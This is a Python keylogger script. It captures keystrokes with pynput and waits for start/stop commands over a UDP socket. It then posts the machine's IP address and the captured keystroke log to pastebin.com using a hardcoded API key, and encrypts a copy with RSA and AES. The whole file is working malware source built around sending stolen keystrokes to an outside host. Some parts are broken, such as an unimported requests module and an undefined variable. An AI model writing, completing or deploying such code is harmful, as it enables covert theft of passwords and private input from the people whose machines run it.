from pynput.keyboard import Key, Listener
import socket
from pastebin import PastebinAPI
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP

output = []


def on_press(key):
    if key == Key.enter:
        output.append("\n")
    elif key == Key.space:
        output.append(" ")
    else:
        output.append(str(key))


def key_thread():
    listener = Listener(on_press=on_press)
    listener.start()


def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ip = "127.0.0.1"  # localhost
    port = 10101
    addr = (ip, port)
    sock.bind(addr)

    dev_key = '475b38cdfbba7a92d8bde6c56adfb241'
    pastebin_url = "http://pastebin.com/api/api_post.php"

    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)

    ip_data = {'api_dev_key': dev_key,
               'api_option': 'paste',
               'api_paste_code': str(ip),
               # 'api_paste_private': 0,
               'api_paste_name': 'url_test'}

    key_url = requests.post(url=pastebin_url, data=ip_data)

    log_dir = "./"

    com = sock.recv(20).decode()
    print(com)
    started = False
    while com != "stop":
        if com == "start" and not started:
            key_thread()
            started = True
        print(output)
        com = sock.recv(20).decode()
        print(com)

    fi = open(log_dir + "out.txt", "w")
    outstring = ''
    for i in output:
        b = i.replace("\'", '')
        print(b)
        fi.write(b)
        outstring = outstring + b
    fi.close()

    key_data = {'api_dev_key': dev_key,
                'api_option': 'paste',
                'api_paste_code': outstring,
                'api_paste_private': 0,
                'api_paste_name': 'key_test'}
    key_url = requests.post(url=pastebin_url, data=key_data)
    print(ip_url.text)
    print(key_url.text)
    # remove(argv[0])

    # encode output string in RSA (assumes key is in directory and stored as receiver.pem)
    data = outstring.encode("utf-8")
    file_out = open("encrypted_data_key.bin", "wb")  # writes to file for now

    recipient_key = RSA.import_key(open("receiver.pem").read())
    session_key = get_random_bytes(16)

    # Encrypt the session key with the public RSA key
    cipher_rsa = PKCS1_OAEP.new(recipient_key)
    enc_session_key = cipher_rsa.encrypt(session_key)

    # Encrypt the data with the AES session key
    cipher_aes = AES.new(session_key, AES.MODE_EAX)
    ciphertext, tag = cipher_aes.encrypt_and_digest(data)
    [file_out.write(x) for x in (enc_session_key, cipher_aes.nonce, tag, ciphertext)]
    file_out.close()


if __name__ == "__main__":
    main()
